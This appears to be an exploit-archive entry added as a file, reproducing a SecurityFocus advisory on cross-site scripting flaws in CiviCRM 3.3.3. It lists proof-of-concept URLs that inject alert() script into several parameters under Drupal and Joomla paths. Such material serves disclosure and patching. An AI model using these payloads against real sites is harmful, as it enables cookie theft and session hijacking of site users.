@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/46275/info
+
+CiviCRM is prone to multiple cross-site scripting vulnerabilities because they fail to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+CiviCRM 3.3.3. is vulnerable; prior versions may also be affected. 
+
+Drupal:
+
+http://www.example.com/drupal-6.20/sites/all/modules/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?defaultPath=%3Cscript%3Ealert(0)%3C/script%3E
+
+http://www.example.com/drupal-6.20/sites/all/modules/civicrm/packages/amfphp/browser/code.php?class=%3Cscript%3Ealert(0)%3C/script%3E
+
+http://www.example.com/drupal-6.20/sites/all/modules/civicrm/packages/amfphp/browser/details.php?class=<script>alert(0)</script>
+
+http://www.example.com/drupal-6.20/sites/all/modules/civicrm/packages/amfphp/browser/methodTable.php?class=%3Cscript%3Ealert(0)%3C/script%3E
+
+
+Joomla:
+
+http://www.example.com/joomla/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?defaultPath=%3Cscript%3Ealert(0)%3C/script%3E
+
+http://www.example.com/joomla/administrator/components/com_civicrm/civicrm/packages/amfphp/browser/methodTable.php?class=%3Cscript%3Ealert(0)%3C/script%3E
+
+http://www.example.com/joomla/administrator/components/com_civicrm/civicrm/packages/PHPgettext/examples/pigs_dropin.php?lang=0%3Cscript%3Ealert(0)%3C/script%3E
+
+http://www.example.com/joomla/administrator/components/com_civicrm/civicrm/packages/PHPgettext/examples/pigs_fallback.php?lang=%3Cscript%3Ealert(0)%3C/script%3E
